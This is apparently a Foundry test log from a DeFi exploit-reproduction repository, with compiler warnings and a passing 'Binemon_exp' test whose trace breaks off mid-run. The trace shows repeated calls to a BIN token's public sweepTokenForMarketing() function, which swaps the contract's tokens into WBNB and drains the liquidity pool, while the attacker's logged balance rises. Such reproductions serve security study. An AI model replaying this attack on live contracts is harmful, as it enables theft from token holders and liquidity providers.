Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.31s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-03/Binemon_exp.sol:23:5:
   |
23 |     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2080:1:
     |
2080 | interface WBNB {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 246.53ms (309.13µs CPU time)

Ran 1 test for src/test/2024-03/Binemon_exp.sol:ContractTest
[PASS] testExploit() (gas: 1350761)
Logs:
  Attacker WBNB balance before attack:: 1.000000000000000000
  Attacker WBNB balance before attack:: 1.207952053820379849

Traces:
  [1693717] ContractTest::testExploit()
    ├─ [24420] WBNB::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [24586] BIN::approve(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [2534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return] 
    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c])
    │   └─ ← [Return] [0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c], []
    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], slot: 13407199363679635973052879518465057167389910613330280238043615909335847287356 [1.34e76])
    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return] 
    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ emit SlotFound(who: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 13407199363679635973052879518465057167389910613330280238043615909335847287356 [1.34e76])
    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000)
    │   └─ ← [Return] 
    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ [2534] WBNB::balanceOf(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::record()
    │   └─ ← [Return] 
    ├─ [534] WBNB::balanceOf(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::accesses(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c])
    │   └─ ← [Return] [0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690], []
    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ emit WARNING_UninitedSlot(who: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], slot: 20618575761630381795067922644616484003553126470430638090854615534961829922448 [2.061e76])
    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [534] WBNB::balanceOf(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    │   └─ ← [Return] 
    ├─ [534] WBNB::balanceOf(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4) [staticcall]
    │   └─ ← [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690, 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return] 
    ├─ emit SlotFound(who: WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], fsig: 0x70a08231, keysHash: 0x564461b75e245267209194b869465fae25d065bc4853f0b24a68f02d63f20a99, slot: 20618575761630381795067922644616484003553126470430638090854615534961829922448 [2.061e76])
    ├─ [0] VM::load(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690) [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    ├─ [0] VM::store(WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690, 0x0000000000000000000000000000000000000000000000008ac7230489e80000)
    │   └─ ← [Return] 
    ├─ [534] WBNB::balanceOf(0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4) [staticcall]
    │   └─ ← [Return] 10000000000000000000 [1e19]
    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ emit log_named_decimal_uint(key: "Attacker WBNB balance before attack:", val: 1000000000000000000 [1e18], decimals: 18)
    ├─ [2532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 12048305953898063254994587 [1.204e25]
    ├─ [138085] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [121732] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [25023] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640207639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [2893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 70400341474082036708 [7.04e19], 29652882184550549714540985 [2.965e25], 1710122977 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 30652882184550549714540985 [3.065e25]
    │   │   ├─ [64340] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(2291140782440021163 [2.291e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [29962] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 2291140782440021163 [2.291e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 2291140782440021163 [2.291e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 68109200691642015545 [6.81e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 30652882184550549714540985 [3.065e25]
    │   │   │   ├─ emit Sync(reserve0: 68109200691642015545 [6.81e19], reserve1: 30652882184550549714540985 [3.065e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 2291140782440021163 [2.291e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 2291140782440021163 [2.291e18]
    │   │   ├─ [9223] WBNB::withdraw(2291140782440021163 [2.291e18])
    │   │   │   ├─ [83] Router::fallback{value: 2291140782440021163}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 2291140782440021163 [2.291e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 2291140782440021163}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 11048305953898063254994587 [1.104e25]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640206639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 68109200691642015545 [6.81e19], 30652882184550549714540985 [3.065e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 31652882184550549714540985 [3.165e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(2146543675010528950 [2.146e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 2146543675010528950 [2.146e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 2146543675010528950 [2.146e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 65962657016631486595 [6.596e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 31652882184550549714540985 [3.165e25]
    │   │   │   ├─ emit Sync(reserve0: 65962657016631486595 [6.596e19], reserve1: 31652882184550549714540985 [3.165e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 2146543675010528950 [2.146e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 2146543675010528950 [2.146e18]
    │   │   ├─ [9223] WBNB::withdraw(2146543675010528950 [2.146e18])
    │   │   │   ├─ [83] Router::fallback{value: 2146543675010528950}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 2146543675010528950 [2.146e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 2146543675010528950}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 10048305953898063254994587 [1.004e25]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640205639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 65962657016631486595 [6.596e19], 31652882184550549714540985 [3.165e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 32652882184550549714540985 [3.265e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(2015221445255362781 [2.015e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 2015221445255362781 [2.015e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 2015221445255362781 [2.015e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 63947435571376123814 [6.394e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 32652882184550549714540985 [3.265e25]
    │   │   │   ├─ emit Sync(reserve0: 63947435571376123814 [6.394e19], reserve1: 32652882184550549714540985 [3.265e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 2015221445255362781 [2.015e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 2015221445255362781 [2.015e18]
    │   │   ├─ [9223] WBNB::withdraw(2015221445255362781 [2.015e18])
    │   │   │   ├─ [83] Router::fallback{value: 2015221445255362781}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 2015221445255362781 [2.015e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 2015221445255362781}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 9048305953898063254994587 [9.048e24]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640204639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 63947435571376123814 [6.394e19], 32652882184550549714540985 [3.265e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 33652882184550549714540985 [3.365e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(1895597102957529460 [1.895e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1895597102957529460 [1.895e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1895597102957529460 [1.895e18])
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [534] WBNB::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 62051838468418594354 [6.205e19]
    │   │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   │   └─ ← [Return] 33652882184550549714540985 [3.365e25]
    │   │   │   ├─ emit Sync(reserve0: 62051838468418594354 [6.205e19], reserve1: 33652882184550549714540985 [3.365e25])
    │   │   │   ├─ emit Swap(sender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000 [1e24], amount0Out: 1895597102957529460 [1.895e18], amount1Out: 0, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [534] WBNB::balanceOf(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]) [staticcall]
    │   │   │   └─ ← [Return] 1895597102957529460 [1.895e18]
    │   │   ├─ [9223] WBNB::withdraw(1895597102957529460 [1.895e18])
    │   │   │   ├─ [83] Router::fallback{value: 1895597102957529460}()
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Withdrawal(src: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], wad: 1895597102957529460 [1.895e18])
    │   │   │   └─ ← [Stop] 
    │   │   ├─ [0] 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453::fallback{value: 1895597102957529460}()
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [532] BIN::balanceOf(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]) [staticcall]
    │   └─ ← [Return] 8048305953898063254994587 [8.048e24]
    ├─ [76101] BIN::sweepTokenForMarketing()
    │   ├─ [275] Router::WETH() [staticcall]
    │   │   └─ ← [Return] WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]
    │   ├─ [70248] Router::swapExactTokensForETHSupportingFeeOnTransferTokens(1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9])
    │   │   ├─ [6623] BIN::transferFrom(BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Transfer(from: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], to: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, value: 1000000000000000000000000 [1e24])
    │   │   │   ├─ emit Approval(owner: BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], spender: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640203639085175116878584641522 [1.157e77])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [893] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 62051838468418594354 [6.205e19], 33652882184550549714540985 [3.365e25], 1710126485 [1.71e9]
    │   │   ├─ [532] BIN::balanceOf(0xe432afB7283A08Be24E9038C30CA6336A7cC8218) [staticcall]
    │   │   │   └─ ← [Return] 34652882184550549714540985 [3.465e25]
    │   │   ├─ [38256] 0xe432afB7283A08Be24E9038C30CA6336A7cC8218::swap(1786321101527279168 [1.786e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x)
    │   │   │   ├─ [23162] WBNB::transfer(Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 1786321101527279168 [1.786e18])
    │   │   │   │   ├─ emit Transfer(from: 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, to: Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 1786321101527279168 [1.786e18])
    │   │   │   │   └─ ← [Return] true
